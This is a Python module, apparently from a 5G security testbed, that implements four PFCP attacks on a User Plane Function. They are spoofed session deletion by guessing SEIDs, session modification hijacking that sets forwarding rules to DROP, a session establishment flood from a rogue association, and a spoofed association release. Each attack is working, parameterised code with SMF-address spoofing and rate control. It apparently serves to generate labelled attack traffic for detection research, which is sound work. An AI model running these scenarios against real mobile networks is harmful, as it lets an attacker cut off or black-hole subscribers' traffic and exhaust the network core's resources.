"""N4 (PFCP) attacks against the UPF. See docs/threat-model.md section 3.

Spoofed variants impersonate the SMF: the UPF answers the real SMF, so the injector is
blind to the result, exactly like a real off-path attacker. The probe still sees both
directions, and the reserved PFCP sequence numbers in the manifest label them.
"""

from __future__ import annotations

import ipaddress
import secrets
import socket
import time
from typing import Any, ClassVar

from prahari_attacks import pfcp
from prahari_attacks.scenarios.base import (
    PFCP_PORT,
    SMF_IP,
    UPF_IP,
    Context,
    Pacer,
    Param,
    Scenario,
)


def _send(ctx: Context, msg: bytes, *, spoof: bool, sock: socket.socket | None) -> None:
    upf = ctx.params["upf"]
    if spoof:
        ctx.guard.send_udp_spoofed(ctx.params["smf"], PFCP_PORT, upf, PFCP_PORT, msg)
    else:
        if sock is None:
            raise RuntimeError("unspoofed send needs a bound socket")
        ctx.guard.sendto(sock, msg, upf, PFCP_PORT)


def _socket(ctx: Context) -> socket.socket:
    # A PFCP peer listens on 8805: the UPF sends association replies and heartbeats
    # there, whatever port the request came from.
    return ctx.guard.udp_socket(ctx.attacker_ip, PFCP_PORT)


def _recv(sock: socket.socket, timeout: float) -> pfcp.Response | None:
    """One PFCP message. Heartbeat Requests from the UPF are answered on the spot, as
    a real control-plane peer would, so a rogue association stays up."""
    sock.settimeout(timeout)
    try:
        data, peer = sock.recvfrom(65535)
    except TimeoutError:
        return None
    try:
        r = pfcp.parse(data)
    except ValueError:
        return None
    if r.msg_type == pfcp.MsgType.HEARTBEAT_REQUEST:
        sock.sendto(pfcp.heartbeat_response(r.seq), peer)
    return r


def _drain(
    ctx: Context, sock: socket.socket, wanted: set[int], wait: float
) -> dict[int, pfcp.Response]:
    """Collects responses for the given sequence numbers until all arrive or `wait` passes."""
    got: dict[int, pfcp.Response] = {}
    deadline = time.monotonic() + wait
    while wanted - got.keys() and time.monotonic() < deadline:
        r = _recv(sock, max(0.01, deadline - time.monotonic()))
        if r is not None and r.seq in wanted:
            got[r.seq] = r
            ctx.manifest.count(f"response:{r.cause_name}")
    return got


def _associate(ctx: Context, sock: socket.socket) -> pfcp.Response | None:
    seq = ctx.manifest.next_pfcp_seq()
    _send(ctx, pfcp.association_setup_request(seq, ctx.attacker_ip), spoof=False, sock=sock)
    ctx.manifest.count("sent:AssociationSetupRequest")
    return _drain(ctx, sock, {seq}, 2.0).get(seq)


class _N4(Scenario):
    interface: ClassVar[str] = "N4"
    common: ClassVar[tuple[Param, ...]] = (
        Param("upf", UPF_IP, "target UPF"),
        Param("smf", SMF_IP, "SMF address to impersonate when spoofing"),
    )

    @classmethod
    def targets(cls, params: dict[str, Any]) -> list[str]:
        return [params["upf"]]


class SessionDeletion(_N4):
    attack_id = "N4-01"
    title = "PFCP session deletion with guessed SEIDs"
    mechanism = (
        "Session Deletion Requests for a range of UP SEIDs. Open5GS allocates SEIDs in a "
        "small space (about 1-4096 at max ue 1024), so a scan finds live sessions."
    )
    params = (
        *_N4.common,
        Param("seid_start", 1, "first UP SEID to try"),
        Param("seid_count", 4096, "number of SEIDs to try"),
        Param("spoof", True, "send as the SMF (blind) instead of from the attacker address"),
        Param("rate", 500.0, "messages per second (0 = unpaced)"),
    )

    @classmethod
    def spoofed_sources(cls, params: dict[str, Any]) -> list[str]:
        return [params["smf"]] if params["spoof"] else []

    def run(self, ctx: Context) -> None:
        p = ctx.params
        sock = None if p["spoof"] else _socket(ctx)
        pace = Pacer(p["rate"])
        seqs: set[int] = set()
        for seid in range(p["seid_start"], p["seid_start"] + p["seid_count"]):
            if ctx.expired():
                break
            pace.wait()
            seq = ctx.manifest.next_pfcp_seq()
            seqs.add(seq)
            _send(ctx, pfcp.session_deletion_request(seq, seid), spoof=p["spoof"], sock=sock)
            ctx.manifest.count("sent:SessionDeletionRequest")
        if sock is not None:
            got = _drain(ctx, sock, seqs, 3.0)
            deleted = sorted(
                r.seid or 0
                for r in got.values()
                if r.cause == 1  # header SEID = CP side
            )
            ctx.manifest.outcome["deleted_sessions"] = len(deleted)
        else:
            ctx.manifest.notes.append("spoofed: responses went to the SMF; see probe events")


class SessionModificationHijack(_N4):
    attack_id = "N4-02"
    title = "PFCP session modification hijack (FAR set to DROP)"
    mechanism = (
        "Session Modification Requests that update a FAR's Apply Action to DROP (or BUFF), "
        "black-holing the UE's traffic without tearing the session down."
    )
    params = (
        *_N4.common,
        Param("seid_start", 1, "first UP SEID to try"),
        Param("seid_count", 4096, "number of SEIDs to try"),
        Param("far_ids", "1,2", "comma-separated FAR IDs to rewrite in each session"),
        Param("action", "drop", "drop | buffer | forward"),
        Param("spoof", True, "send as the SMF (blind) instead of from the attacker address"),
        Param("rate", 500.0, "messages per second (0 = unpaced)"),
    )

    @classmethod
    def spoofed_sources(cls, params: dict[str, Any]) -> list[str]:
        return [params["smf"]] if params["spoof"] else []

    def run(self, ctx: Context) -> None:
        p = ctx.params
        action = {
            "drop": pfcp.ApplyAction.DROP,
            "buffer": pfcp.ApplyAction.BUFF,
            "forward": pfcp.ApplyAction.FORW,
        }[p["action"]]
        fars = [int(x) for x in str(p["far_ids"]).split(",") if x.strip()]
        sock = None if p["spoof"] else _socket(ctx)
        pace = Pacer(p["rate"])
        seqs: set[int] = set()
        for seid in range(p["seid_start"], p["seid_start"] + p["seid_count"]):
            for far in fars:
                if ctx.expired():
                    break
                pace.wait()
                seq = ctx.manifest.next_pfcp_seq()
                seqs.add(seq)
                msg = pfcp.session_modification_request(seq, seid, far, action)
                _send(ctx, msg, spoof=p["spoof"], sock=sock)
                ctx.manifest.count("sent:SessionModificationRequest")
        if sock is not None:
            got = _drain(ctx, sock, seqs, 3.0)
            ctx.manifest.outcome["modified"] = sum(1 for r in got.values() if r.cause == 1)
        else:
            ctx.manifest.notes.append("spoofed: responses went to the SMF; see probe events")


class EstablishmentFlood(_N4):
    attack_id = "N4-03"
    title = "PFCP session establishment flood"
    mechanism = (
        "Associates as a fake control-plane node, then floods Session Establishment "
        "Requests, each allocating UPF state (PDRs, FARs, TEIDs)."
    )
    params = (
        *_N4.common,
        Param("count", 2000, "establishment requests to send"),
        Param("rate", 200.0, "messages per second (0 = unpaced)"),
        Param("ue_pool", "10.45.200.0/24", "UE addresses to claim (cycled)"),
        Param("cleanup", True, "delete the created sessions at the end"),
    )

    def run(self, ctx: Context) -> None:
        p = ctx.params
        sock = _socket(ctx)
        assoc = _associate(ctx, sock)
        ctx.manifest.outcome["association"] = assoc.cause_name if assoc else "no response"
        pool = list(ipaddress.IPv4Network(p["ue_pool"]).hosts())
        pace = Pacer(p["rate"])
        seqs: dict[int, int] = {}
        answered: set[int] = set()
        for i in range(p["count"]):
            if ctx.expired():
                break
            pace.wait()
            seq = ctx.manifest.next_pfcp_seq()
            cp_seid = secrets.randbits(32) | 1
            seqs[seq] = cp_seid
            msg = pfcp.session_establishment_request(
                seq, ctx.attacker_ip, cp_seid, str(pool[i % len(pool)])
            )
            ctx.guard.sendto(sock, msg, p["upf"], PFCP_PORT)
            ctx.manifest.count("sent:SessionEstablishmentRequest")
            # Read replies as we go so the socket buffer never overflows.
            while (r := _recv(sock, 0.0001)) is not None:
                if r.seq in seqs and r.seq not in answered:
                    answered.add(r.seq)
                    ctx.manifest.count(f"response:{r.cause_name}")
                    if r.cause == 1 and r.up_seid:
                        ctx.manifest.outcome.setdefault("_up_seids", []).append(r.up_seid)
        tail = _drain(ctx, sock, set(seqs) - answered, 3.0)
        created: list[int] = ctx.manifest.outcome.pop("_up_seids", [])
        created += [r.up_seid for r in tail.values() if r.cause == 1 and r.up_seid]
        ctx.manifest.outcome["sessions_created"] = len(created)
        if p["cleanup"] and created:
            dels: set[int] = set()
            for seid in created:
                seq = ctx.manifest.next_pfcp_seq()
                dels.add(seq)
                ctx.guard.sendto(
                    sock, pfcp.session_deletion_request(seq, seid), p["upf"], PFCP_PORT
                )
                ctx.manifest.count("sent:SessionDeletionRequest(cleanup)")
            got = _drain(ctx, sock, dels, 3.0)
            ctx.manifest.outcome["sessions_cleaned_up"] = sum(
                1 for r in got.values() if r.cause == 1
            )


class RogueAssociation(_N4):
    attack_id = "N4-04"
    title = "Rogue PFCP association"
    mechanism = (
        "setup: Association Setup from an unknown node (the UPF accepts a fake "
        "control-plane peer). release: Association Release spoofed from the SMF, asking "
        "the UPF to drop its real controller."
    )
    params = (
        *_N4.common,
        Param("mode", "setup", "setup | release"),
        Param("repeat", 3, "how many times to send"),
        Param("interval", 1.0, "seconds between sends"),
    )

    @classmethod
    def spoofed_sources(cls, params: dict[str, Any]) -> list[str]:
        return [params["smf"]] if params["mode"] == "release" else []

    def run(self, ctx: Context) -> None:
        p = ctx.params
        if p["mode"] not in ("setup", "release"):
            raise ValueError("mode must be setup or release")
        sock = _socket(ctx) if p["mode"] == "setup" else None
        for i in range(p["repeat"]):
            if ctx.expired():
                break
            if i:
                time.sleep(p["interval"])
            seq = ctx.manifest.next_pfcp_seq()
            if p["mode"] == "setup":
                if sock is None:
                    raise RuntimeError("setup mode needs a bound socket")
                msg = pfcp.association_setup_request(seq, ctx.attacker_ip)
                ctx.guard.sendto(sock, msg, p["upf"], PFCP_PORT)
                ctx.manifest.count("sent:AssociationSetupRequest")
                r = _drain(ctx, sock, {seq}, 2.0).get(seq)
                ctx.manifest.outcome["last_setup"] = r.cause_name if r else "no response"
            else:
                msg = pfcp.association_release_request(seq, p["smf"])
                _send(ctx, msg, spoof=True, sock=None)
                ctx.manifest.count("sent:AssociationReleaseRequest")
        if p["mode"] == "release":
            ctx.manifest.notes.append("spoofed: responses went to the SMF; see probe events")
